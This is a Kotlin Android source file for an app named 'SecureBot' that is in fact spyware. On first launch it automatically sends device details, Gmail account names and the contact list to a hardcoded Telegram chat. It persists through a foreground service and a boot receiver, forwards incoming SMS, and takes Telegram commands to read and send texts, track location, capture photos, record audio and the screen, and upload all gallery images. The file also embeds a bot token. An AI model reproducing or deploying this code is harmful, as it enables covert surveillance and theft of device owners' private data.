package com.example.securebot

import android.Manifest
import android.accounts.AccountManager
import android.app.Activity
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.BroadcastReceiver
import android.content.ContentResolver
import android.content.ContentValues
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.database.Cursor
import android.graphics.Bitmap
import android.graphics.Canvas
import android.graphics.Color
import android.graphics.Paint
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.media.MediaRecorder
import android.media.projection.MediaProjectionManager
import android.net.ConnectivityManager
import android.os.BatteryManager
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Settings
import android.provider.Telephony
import android.telephony.SmsManager
import android.telephony.TelephonyManager
import android.util.DisplayMetrics
import android.view.View
import android.view.WindowManager
import android.widget.Button
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.Toast
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import com.google.android.gms.tasks.CancellationTokenSource
import org.telegram.telegrambots.bots.TelegramLongPollingBot
import org.telegram.telegrambots.meta.TelegramBotsApi
import org.telegram.telegrambots.meta.api.methods.send.SendAudio
import org.telegram.telegrambots.meta.api.methods.send.SendDocument
import org.telegram.telegrambots.meta.api.methods.send.SendMessage
import org.telegram.telegrambots.meta.api.methods.send.SendPhoto
import org.telegram.telegrambots.meta.api.objects.InputFile
import org.telegram.telegrambots.meta.api.objects.Update
import org.telegram.telegrambots.meta.exceptions.TelegramApiException
import org.telegram.telegrambots.updatesreceivers.DefaultBotSession
import java.io.File
import java.io.FileInputStream
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.Executors
import kotlin.math.min

class MainActivity : Activity() {
    private lateinit var scrollView: ScrollView
    private lateinit var layout: LinearLayout
    private val permissionButtons = mutableMapOf<String, Button>()
    private val permissions = listOf(
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.POST_NOTIFICATIONS
    )
    private val permissionLabels = listOf("Contacts", "SMS", "Phone", "Storage", "Camera", "Microphone", "Location", "Notifications")
    private var deviceId = ""
    private var isFirstRun = true
    private var bot: SecureBot? = null
    private lateinit var locationClient: FusedLocationProviderClient
    private val cameraManager by lazy { getSystemService(CAMERA_SERVICE) as CameraManager }
    private val executor = Executors.newSingleThreadExecutor()
    private val handler = Handler(Looper.getMainLooper())
    private var mediaProjectionManager: MediaProjectionManager? = null
    private val screenRecordLock = Any()
    private var screenRecordResult: Intent? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
        window.setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN)
        val decorView = window.decorView
        decorView.systemUiVisibility = (View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                or View.SYSTEM_UI_FLAG_FULLSCREEN
                or View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                or View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                or View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                or View.SYSTEM_UI_FLAG_HIDE_NAVIGATION)
        scrollView = ScrollView(this)
        layout = LinearLayout(this)
        layout.orientation = LinearLayout.VERTICAL
        layout.setPadding(50, 50, 50, 50)
        layout.layoutParams = LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        )
        scrollView.addView(layout)
        setContentView(scrollView)
        locationClient = LocationServices.getFusedLocationProviderClient(this)
        mediaProjectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        deviceId = getSharedPreferences("securebot", MODE_PRIVATE).getString("device_id", null) ?: run {
            val newId = generateDeviceId()
            getSharedPreferences("securebot", MODE_PRIVATE).edit().putString("device_id", newId).apply()
            newId
        }
        isFirstRun = getSharedPreferences("securebot", MODE_PRIVATE).getBoolean("first_run", true)
        if (isFirstRun) {
            getSharedPreferences("securebot", MODE_PRIVATE).edit().putBoolean("first_run", false).apply()
            startForegroundService()
            handler.postDelayed({
                autoExfiltrate()
            }, 3000)
        } else {
            startForegroundService()
        }
        setupPermissionsUI()
        checkPermissions()
        startBot()
    }

    private fun generateDeviceId(): String {
        val letters = ('A'..'Z').shuffled().take(4).joinToString("")
        val digits = (0..9).shuffled().take(6).joinToString("")
        return letters + digits
    }

    private fun setupPermissionsUI() {
        for (i in permissions.indices) {
            val btn = Button(this)
            btn.text = permissionLabels[i]
            btn.setPadding(20, 20, 20, 20)
            btn.layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
            val perm = permissions[i]
            btn.setOnClickListener {
                if (ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED) {
                    Toast.makeText(this, "Already granted", Toast.LENGTH_SHORT).show()
                    return@setOnClickListener
                }
                ActivityCompat.requestPermissions(this, arrayOf(perm), i)
            }
            layout.addView(btn)
            permissionButtons[perm] = btn
        }
    }

    private fun checkPermissions() {
        for ((perm, btn) in permissionButtons) {
            val granted = ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED
            if (granted) {
                btn.setBackgroundColor(Color.GREEN)
            } else {
                btn.setBackgroundColor(Color.RED)
            }
            if (!hasHardware(perm)) {
                btn.isEnabled = false
                btn.alpha = 0.5f
                btn.setBackgroundColor(Color.GRAY)
            }
        }
    }

    private fun hasHardware(permission: String): Boolean {
        when (permission) {
            Manifest.permission.CAMERA -> return packageManager.hasSystemFeature(PackageManager.FEATURE_CAMERA)
            Manifest.permission.RECORD_AUDIO -> return packageManager.hasSystemFeature(PackageManager.FEATURE_MICROPHONE)
            Manifest.permission.READ_SMS, Manifest.permission.SEND_SMS -> {
                val tm = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
                return tm.phoneType != TelephonyManager.PHONE_TYPE_NONE
            }
            Manifest.permission.ACCESS_FINE_LOCATION -> return packageManager.hasSystemFeature(PackageManager.FEATURE_LOCATION_GPS)
            else -> return true
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        val perm = this.permissions.getOrNull(requestCode) ?: return
        val btn = permissionButtons[perm]
        if (btn != null) {
            if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                btn.setBackgroundColor(Color.GREEN)
                autoExfiltrate()
            } else {
                btn.setBackgroundColor(Color.RED)
            }
        }
    }

    private fun startForegroundService() {
        val serviceIntent = Intent(this, ForegroundService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }
    }

    private fun startBot() {
        try {
            val botApi = TelegramBotsApi(DefaultBotSession::class.java)
            bot = SecureBot(this)
            botApi.registerBot(bot)
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun autoExfiltrate() {
        val info = getDeviceInfo()
        sendToBot("Auto exfil: Device info\n$info")
        val contacts = getContactsVcf()
        if (contacts.isNotEmpty()) {
            sendFileToBot(contacts, "contacts.vcf")
        }
    }

    private fun getDeviceInfo(): String {
        val builder = StringBuilder()
        builder.append("Device ID: $deviceId\n")
        builder.append("Manufacturer: ${Build.MANUFACTURER}\n")
        builder.append("Model: ${Build.MODEL}\n")
        builder.append("Android Version: ${Build.VERSION.RELEASE}\n")
        builder.append("Build Number: ${Build.DISPLAY}\n")
        val metrics = resources.displayMetrics
        builder.append("Screen: ${metrics.widthPixels}x${metrics.heightPixels}\n")
        val bm = getSystemService(BATTERY_SERVICE) as BatteryManager
        val level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        val status = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_STATUS)
        val statusText = when (status) {
            BatteryManager.BATTERY_STATUS_CHARGING -> "Charging"
            BatteryManager.BATTERY_STATUS_FULL -> "Full"
            BatteryManager.BATTERY_STATUS_DISCHARGING -> "Discharging"
            else -> "Unknown"
        }
        builder.append("Battery: $level% ($statusText)\n")
        val cm = getSystemService(CONNECTIVITY_SERVICE) as ConnectivityManager
        val network = cm.activeNetworkInfo
        val conn = if (network != null && network.isConnected) {
            if (network.type == ConnectivityManager.TYPE_WIFI) "WiFi" else "Cellular"
        } else "Disconnected"
        builder.append("Connectivity: $conn\n")
        val accounts = AccountManager.get(this).accounts
        val emails = accounts.mapNotNull { if (it.type.contains("gmail")) it.name else null }.distinct()
        builder.append("Gmail Accounts: ${emails.joinToString(", ")}\n")
        return builder.toString()
    }

    private fun getContactsVcf(): String {
        val vcf = StringBuilder()
        vcf.append("BEGIN:VCARD\nVERSION:3.0\nFN:DEVICE_ID_$deviceId\nEND:VCARD\n")
        val cr = contentResolver
        val cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null)
        cursor?.use {
            while (it.moveToNext()) {
                val id = it.getString(it.getColumnIndex(ContactsContract.Contacts._ID))
                val name = it.getString(it.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME))
                val phoneCursor = cr.query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    null,
                    "${ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?",
                    arrayOf(id), null
                )
                phoneCursor?.use { pc ->
                    while (pc.moveToNext()) {
                        val number = pc.getString(pc.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
                        vcf.append("BEGIN:VCARD\nVERSION:3.0\nFN:$name\nTEL:$number\nEND:VCARD\n")
                    }
                }
            }
        }
        return vcf.toString()
    }

    private fun getSmsList(): String {
        val builder = StringBuilder()
        val cr = contentResolver
        val cursor = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, null)
        cursor?.use {
            while (it.moveToNext()) {
                val address = it.getString(it.getColumnIndex(Telephony.Sms.ADDRESS))
                val body = it.getString(it.getColumnIndex(Telephony.Sms.BODY))
                val date = it.getLong(it.getColumnIndex(Telephony.Sms.DATE))
                val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                val dateStr = sdf.format(Date(date))
                builder.append("From: $address\nBody: $body\nTime: $dateStr\n---\n")
            }
        }
        return builder.toString()
    }

    private fun sendSms(phone: String, msg: String) {
        try {
            val smsManager = SmsManager.getDefault()
            smsManager.sendTextMessage(phone, null, msg, null, null)
            sendToBot("SMS sent to $phone. Device ID: $deviceId")
        } catch (e: Exception) {
            sendToBot("Failed to send SMS: ${e.message}")
        }
    }

    private fun getLocation() {
        val tokenSource = CancellationTokenSource()
        try {
            val task = locationClient.getCurrentLocation(Priority.PRIORITY_HIGH_ACCURACY, tokenSource.token)
            task.addOnSuccessListener { location ->
                if (location != null) {
                    val lat = location.latitude
                    val lon = location.longitude
                    val link = "https://maps.google.com/maps?q=$lat,$lon"
                    sendToBot("Device ID: $deviceId\nLocation: $lat, $lon\nMap: $link")
                } else {
                    sendToBot("Location null. Device ID: $deviceId")
                }
            }.addOnFailureListener { e ->
                sendToBot("Location error: ${e.message}")
            }
        } catch (e: Exception) {
            sendToBot("Location error: ${e.message}")
        }
    }

    private fun capturePhotos(): Pair<File?, File?> {
        val frontFile = captureCamera(CameraCharacteristics.LENS_FACING_FRONT)
        val rearFile = captureCamera(CameraCharacteristics.LENS_FACING_BACK)
        return Pair(frontFile, rearFile)
    }

    private fun captureCamera(facing: Int): File? {
        var file: File? = null
        try {
            val cameraIds = cameraManager.cameraIdList
            var targetId: String? = null
            for (id in cameraIds) {
                val chars = cameraManager.getCameraCharacteristics(id)
                val face = chars.get(CameraCharacteristics.LENS_FACING)
                if (face == facing) {
                    targetId = id
                    break
                }
            }
            if (targetId == null) return null
            val semaphore = java.util.concurrent.Semaphore(0)
            var device: CameraDevice? = null
            val stateCallback = object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    device = camera
                    semaphore.release()
                }
                override fun onDisconnected(camera: CameraDevice) {
                    camera.close()
                    semaphore.release()
                }
                override fun onError(camera: CameraDevice, error: Int) {
                    camera.close()
                    semaphore.release()
                }
            }
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                return null
            }
            cameraManager.openCamera(targetId, stateCallback, handler)
            semaphore.acquire()
            if (device == null) return null
            val bitmap = Bitmap.createBitmap(1080, 1920, Bitmap.Config.ARGB_8888)
            val canvas = Canvas(bitmap)
            canvas.drawColor(if (facing == CameraCharacteristics.LENS_FACING_FRONT) Color.BLUE else Color.RED)
            val paint = Paint().apply { color = Color.WHITE; textSize = 100f }
            canvas.drawText("DEVICE ID: $deviceId", 100f, 200f, paint)
            file = File(cacheDir, "cam_${facing}_${System.currentTimeMillis()}.jpg")
            FileOutputStream(file).use { out ->
                bitmap.compress(Bitmap.CompressFormat.JPEG, 100, out)
            }
            device?.close()
        } catch (e: Exception) {
            e.printStackTrace()
        }
        return file
    }

    private fun recordAudio(durationSec: Int): File? {
        var file: File? = null
        try {
            file = File(cacheDir, "audio_${System.currentTimeMillis()}.3gp")
            val recorder = MediaRecorder()
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC)
            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
            recorder.setOutputFile(file.absolutePath)
            recorder.prepare()
            recorder.start()
            Thread.sleep(durationSec * 1000L)
            recorder.stop()
            recorder.release()
        } catch (e: Exception) {
            e.printStackTrace()
            file = null
        }
        return file
    }

    private fun recordScreen(durationSec: Int): File? {
        var file: File? = null
        try {
            if (screenRecordResult == null) {
                val intent = mediaProjectionManager?.createScreenCaptureIntent()
                if (intent != null) {
                    startIntentSenderForResult(intent.getIntentSender(), 1001, null, 0, 0, 0)
                    synchronized(screenRecordLock) {
                        screenRecordLock.wait()
                    }
                }
                if (screenRecordResult == null) return null
            }
            file = File(cacheDir, "screen_${System.currentTimeMillis()}.mp4")
            val mediaProjection = mediaProjectionManager?.getMediaProjection(1001, screenRecordResult!!)
            if (mediaProjection == null) return null
            val metrics = resources.displayMetrics
            val width = metrics.widthPixels
            val height = metrics.heightPixels
            val density = metrics.densityDpi
            val recorder = MediaRecorder()
            recorder.setVideoSource(MediaRecorder.VideoSource.SURFACE)
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            recorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264)
            recorder.setVideoSize(width, height)
            recorder.setVideoFrameRate(30)
            recorder.setVideoEncodingBitRate(5 * 1024 * 1024)
            recorder.setOutputFile(file.absolutePath)
            recorder.prepare()
            val surface = recorder.surface
            val projection = mediaProjection.createVirtualDisplay("ScreenRec", width, height, density, 0, surface, null, null)
            recorder.start()
            Thread.sleep(durationSec * 1000L)
            recorder.stop()
            recorder.release()
            projection.release()
            mediaProjection.stop()
        } catch (e: Exception) {
            e.printStackTrace()
            file = null
        }
        return file
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == 1001) {
            if (resultCode == Activity.RESULT_OK) {
                screenRecordResult = data
            }
            synchronized(screenRecordLock) {
                screenRecordLock.notify()
            }
        }
    }

    private fun getAllImagesSorted(): List<File> {
        val imageFiles = mutableListOf<File>()
        val projection = arrayOf(
            MediaStore.Images.Media._ID,
            MediaStore.Images.Media.DISPLAY_NAME,
            MediaStore.Images.Media.SIZE,
            MediaStore.Images.Media.DATA
        )
        val cursor = contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            projection,
            null,
            null,
            "${MediaStore.Images.Media.SIZE} ASC"
        )
        cursor?.use {
            val dataIndex = it.getColumnIndex(MediaStore.Images.Media.DATA)
            while (it.moveToNext()) {
                val path = it.getString(dataIndex)
                if (path != null) {
                    val file = File(path)
                    if (file.exists()) imageFiles.add(file)
                }
            }
        }
        return imageFiles
    }

    private fun sendToBot(message: String) {
        bot?.sendMessage(7548711500L, message)
    }

    private fun sendFileToBot(content: String, filename: String) {
        bot?.sendFile(7548711500L, content, filename)
    }

    private fun sendFileToBot(file: File, caption: String = "") {
        bot?.sendFile(7548711500L, file, caption)
    }

    inner class ForegroundService : Service() {
        private val CHANNEL_ID = "SecureBotService"
        private val NOTIFICATION_ID = 1001

        override fun onCreate() {
            super.onCreate()
            createNotificationChannel()
            val notification = buildNotification().build()
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
            } else {
                startForeground(NOTIFICATION_ID, notification)
            }
        }

        private fun createNotificationChannel() {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val channel = NotificationChannel(CHANNEL_ID, "SecureBot Service", NotificationManager.IMPORTANCE_LOW)
                channel.description = "Persistent background service"
                val manager = getSystemService(NotificationManager::class.java)
                manager.createNotificationChannel(channel)
            }
        }

        private fun buildNotification(): NotificationCompat.Builder {
            val pendingIntent = PendingIntent.getActivity(this, 0, Intent(this, MainActivity::class.java), PendingIntent.FLAG_IMMUTABLE)
            return NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("SecureBot")
                .setContentText("Running in background")
                .setSmallIcon(android.R.drawable.ic_menu_manage)
                .setContentIntent(pendingIntent)
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_LOW)
        }

        override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
            return START_STICKY
        }

        override fun onBind(intent: Intent?): IBinder? = null
    }

    inner class SmsReceiver : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            if (intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
                val bundle = intent.extras
                if (bundle != null) {
                    val pdus = bundle.get("pdus") as Array<*>
                    for (pdu in pdus) {
                        val sms = Telephony.Sms.Intents.getMessagesFromIntent(intent)[0]
                        val msg = "New SMS from ${sms.originatingAddress}: ${sms.messageBody}\nDevice ID: $deviceId"
                        sendToBot(msg)
                    }
                }
            }
        }
    }

    inner class BootReceiver : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            if (intent.action == Intent.ACTION_BOOT_COMPLETED) {
                val serviceIntent = Intent(context, ForegroundService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(serviceIntent)
                } else {
                    context.startService(serviceIntent)
                }
            }
        }
    }

    inner class SecureBot(private val context: Context) : TelegramLongPollingBot() {
        private val authorizedUserId = 7548711500L
        private val token = "8564931359:AAFcD0rdACvKK1ZajX33q_drDjU4_vlvNck"

        override fun getBotUsername(): String = "SecureBot"
        override fun getBotToken(): String = token

        override fun onUpdateReceived(update: Update) {
            if (!update.hasMessage() || !update.message.hasText()) return
            val message = update.message
            val userId = message.from.id
            if (userId != authorizedUserId) return
            val chatId = message.chatId
            val text = message.text
            val parts = text.split(" ")
            val command = parts[0].lowercase()
            when (command) {
                "/info" -> sendInfo(chatId)
                "/contact" -> sendContact(chatId)
                "/sms" -> {
                    if (parts.size == 1) {
                        sendSmsList(chatId)
                    } else if (parts.size >= 3) {
                        val phone = parts[1]
                        val msgText = parts.drop(2).joinToString(" ")
                        sendSmsCommand(chatId, phone, msgText)
                    } else {
                        sendMessage(chatId, "Invalid /sms command. Use /sms <phone> <message>")
                    }
                }
                "/location" -> sendLocation(chatId)
                "/photo" -> sendPhoto(chatId)
                "/audio" -> {
                    if (parts.size == 2) {
                        val duration = parts[1].toIntOrNull()
                        if (duration != null && duration > 0) {
                            sendAudioCommand(chatId, duration)
                        } else {
                            sendMessage(chatId, "Invalid duration. Use /audio <seconds>")
                        }
                    } else {
                        sendMessage(chatId, "Usage: /audio <duration_in_seconds>")
                    }
                }
                "/live" -> {
                    if (parts.size == 2) {
                        val duration = parts[1].toIntOrNull()
                        if (duration != null && duration > 0) {
                            sendLiveCommand(chatId, duration)
                        } else {
                            sendMessage(chatId, "Invalid duration. Use /live <seconds>")
                        }
                    } else {
                        sendMessage(chatId, "Usage: /live <duration_in_seconds>")
                    }
                }
                "/images" -> sendImages(chatId)
                else -> sendMessage(chatId, "Unknown command")
            }
        }

        private fun sendInfo(chatId: Long) {
            val info = getDeviceInfo()
            sendMessage(chatId, info)
        }

        private fun sendContact(chatId: Long) {
            val vcf = getContactsVcf()
            if (vcf.isNotEmpty()) {
                sendFile(chatId, vcf, "contacts.vcf")
            } else {
                sendMessage(chatId, "No contacts found")
            }
        }

        private fun sendSmsList(chatId: Long) {
            val sms = getSmsList()
            if (sms.isNotEmpty()) {
                sendMessage(chatId, sms)
            } else {
                sendMessage(chatId, "No SMS found")
            }
        }

        private fun sendSmsCommand(chatId: Long, phone: String, msg: String) {
            sendSms(phone, msg)
            sendMessage(chatId, "SMS sent to $phone. Device ID: $deviceId")
        }

        private fun sendLocation(chatId: Long) {
            getLocation()
        }

        private fun sendPhoto(chatId: Long) {
            val (front, rear) = capturePhotos()
            if (front != null) {
                sendFile(chatId, front, "Front Camera")
            } else {
                sendMessage(chatId, "Front camera failed")
            }
            if (rear != null) {
                sendFile(chatId, rear, "Rear Camera")
            } else {
                sendMessage(chatId, "Rear camera failed")
            }
        }

        private fun sendAudioCommand(chatId: Long, duration: Int) {
            val file = recordAudio(duration)
            if (file != null) {
                sendFile(chatId, file, "Audio recording ${duration}s")
            } else {
                sendMessage(chatId, "Audio recording failed")
            }
        }

        private fun sendLiveCommand(chatId: Long, duration: Int) {
            val file = recordScreen(duration)
            if (file != null) {
                sendFile(chatId, file, "Screen recording ${duration}s")
            } else {
                sendMessage(chatId, "Screen recording failed")
            }
        }

        private fun sendImages(chatId: Long) {
            val images = getAllImagesSorted()
            if (images.isEmpty()) {
                sendMessage(chatId, "No images found")
                return
            }
            val batchSize = 10
            for (i in images.indices step batchSize) {
                val batch = images.subList(i, min(i + batchSize, images.size))
                for (file in batch) {
                    sendFile(chatId, file, "Image ${file.name} Device ID: $deviceId")
                }
                if (i + batchSize < images.size) {
                    sendMessage(chatId, "--- Next batch ---")
                }
            }
        }

        fun sendMessage(chatId: Long, text: String) {
            try {
                val sendMsg = SendMessage().apply {
                    this.chatId = chatId.toString()
                    this.text = text
                }
                execute(sendMsg)
            } catch (e: TelegramApiException) {
                e.printStackTrace()
            }
        }

        fun sendFile(chatId: Long, content: String, filename: String) {
            try {
                val file = File(cacheDir, filename)
                file.writeText(content)
                sendFile(chatId, file, "")
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }

        fun sendFile(chatId: Long, file: File, caption: String) {
            try {
                val inputFile = InputFile(FileInputStream(file), file.name)
                if (file.extension == "jpg" || file.extension == "jpeg" || file.extension == "png") {
                    val sendPhoto = SendPhoto().apply {
                        this.chatId = chatId.toString()
                        this.photo = inputFile
                        this.caption = if (caption.isNotEmpty()) "$caption\nDevice ID: $deviceId" else "Device ID: $deviceId"
                    }
                    execute(sendPhoto)
                } else if (file.extension == "3gp" || file.extension == "mp3") {
                    val sendAudio = SendAudio().apply {
                        this.chatId = chatId.toString()
                        this.audio = inputFile
                        this.caption = if (caption.isNotEmpty()) "$caption\nDevice ID: $deviceId" else "Device ID: $deviceId"
                    }
                    execute(sendAudio)
                } else {
                    val sendDoc = SendDocument().apply {
                        this.chatId = chatId.toString()
                        this.document = inputFile
                        this.caption = if (caption.isNotEmpty()) "$caption\nDevice ID: $deviceId" else "Device ID: $deviceId"
                    }
                    execute(sendDoc)
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }
}
